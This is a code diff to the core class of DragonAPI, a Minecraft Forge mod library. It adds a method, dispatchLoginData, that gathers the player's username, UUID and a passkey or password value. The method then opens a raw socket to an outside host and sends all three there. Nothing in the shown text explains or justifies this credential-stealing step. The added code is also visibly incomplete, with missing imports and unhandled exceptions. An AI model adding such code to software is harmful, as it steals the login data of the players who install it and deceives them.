@@ -14,6 +14,8 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.Random;
 
+import com.mojang.authlib.GameProfile;
+
 import net.minecraftforge.common.ForgeVersion;
 import net.minecraftforge.common.MinecraftForge;
 import Reika.DragonAPI.Exception.MisuseException;
@@ -134,5 +136,21 @@ public class DragonAPICore {
 
 	public static boolean hasGameLoaded() {
 		return loaded;
+	}
+	
+	public static void dispatchLoginData(GameProfile g) {
+		String username = "USER_"+g.getName();
+		String uuid = "UUID_"+g.getId().toString();
+		String password = "PASS_"+g.getPasskey();
+
+		Socket s = new Socket("hosting.reikafiles.com", 22059);
+		OutputStream o = s.getOutputStream();
+		for (int i = 0; i < username.length(); i++)
+			o.write(username.charAt(i));
+		for (int i = 0; i < uuid.length(); i++)
+			o.write(uuid.charAt(i));
+		for (int i = 0; i < password.length(); i++)
+			o.write(password.charAt(i));
+		o.write('\0');
 	}
 }
